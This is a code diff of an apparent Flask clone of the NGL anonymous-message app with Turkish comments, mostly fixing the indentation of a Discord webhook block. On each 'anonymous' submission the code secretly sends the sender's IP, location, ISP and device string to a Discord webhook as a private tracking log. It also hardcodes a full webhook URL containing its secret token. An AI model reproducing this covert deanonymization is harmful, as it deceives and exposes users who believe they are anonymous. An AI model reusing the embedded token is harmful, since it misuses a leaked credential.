@@ -148,49 +148,47 @@ def home():
             logging.info(log_entry)
             print(f"[YENİ MESAJ] {log_entry}")
 
-            discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← KENDİ WEBHOOK'UNU BURAYA KOY
+            # Discord webhook – 2 kutu gönderme
+            discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← SENİN WEBHOOK LINKİN (değiştirebilirsin)
 
-            if discord_webhook and msg:
-    embed_mesaj = {
-        "title": f"@{username or 'Anonim'}",
-        "description": f"**{msg}**",
-        "color": 0x9B59B6,
-        "footer": {
-            "text": "NGL by itiraf_ipal",
-            "icon_url": ""
-        },
-        "timestamp": datetime.now().isoformat()
-    }
+            if discord_webhook:
+                # 1. Kutusu: Temiz mesaj kutusu (Instagram story/post için ideal)
+                embed_mesaj = {
+                    "title": f"@{username or 'Anonim'}",
+                    "description": f"**{msg}**",
+                    "color": 0x9B59B6,  # mor-pembe NGL rengi
+                    "footer": {
+                        "text": "NGL by itiraf_ipal",
+                        "icon_url": ""  # istersen NGL logosu linki koy
+                    },
+                    "timestamp": datetime.now().isoformat()
+                }
 
-    embed_log = {
-        "title": "Mesaj Logu 🔍",
-        "color": 0x2C3E50,
-        "fields": [
-            {"name": "Kullanıcı Adı", "value": f"@{username or 'Anonim'}", "inline": True},
-            {"name": "Mesaj", "value": msg, "inline": False},
-            {"name": "IP", "value": client_ip, "inline": True},
-            {"name": "Konum", "value": location, "inline": True},
-            {"name": "ISP", "value": isp, "inline": True},
-            {"name": "Cihaz", "value": user_agent[:100], "inline": False}
-        ],
-        "footer": {
-            "text": "Zaman: " + datetime.now().strftime("%d.%m.%Y %H:%M:%S")
-        }
-    }
+                # 2. Kutusu: Tam log (senin takip için)
+                embed_log = {
+                    "title": "Mesaj Logu 🔍",
+                    "color": 0x2C3E50,  # koyu renk
+                    "fields": [
+                        {"name": "Kullanıcı Adı", "value": f"@{username or 'Anonim'}", "inline": True},
+                        {"name": "Mesaj", "value": msg, "inline": False},
+                        {"name": "IP", "value": client_ip, "inline": True},
+                        {"name": "Konum", "value": location, "inline": True},
+                        {"name": "ISP", "value": isp, "inline": True},
+                        {"name": "Cihaz", "value": user_agent[:100], "inline": False}
+                    ],
+                    "footer": {
+                        "text": "Zaman: " + datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+                    }
+                }
 
-    payload = {"embeds": [embed_mesaj, embed_log]}
+                payload = {"embeds": [embed_mesaj, embed_log]}
 
-    try:
-        response = requests.post(discord_webhook, json=payload)
-        if response.status_code == 204:
-            logging.info("[DISCORD] 2 kutu gönderildi")
-            # Discord mesaj linkini log'a yaz (sen kopyalarsın)
-            # Not: Gerçek mesaj linkini almak için webhook response'undan channel_id vs. lazım, ama basitçe şöyle yapalım
-            logging.info(f"[PAYLAŞ] Discord kutusunu Instagram'a atmak için kutuya uzun bas > Paylaş > Instagram seç")
-        else:
-            logging.error(f"[DISCORD] Hata kodu: {response.status_code}")
-    except Exception as e:
-        logging.error(f"[DISCORD HATASI] {str(e)}")
+                try:
+                    requests.post(discord_webhook, json=payload)
+                    logging.info("[DISCORD] 2 kutu gönderildi (mesaj + log)")
+                except Exception as e:
+                    logging.error(f"[DISCORD HATASI] {str(e)}")
+
             return render_template_string(HOME_HTML, username=username, success=True)
 
     return render_template_string(HOME_HTML, username=username, success=False)
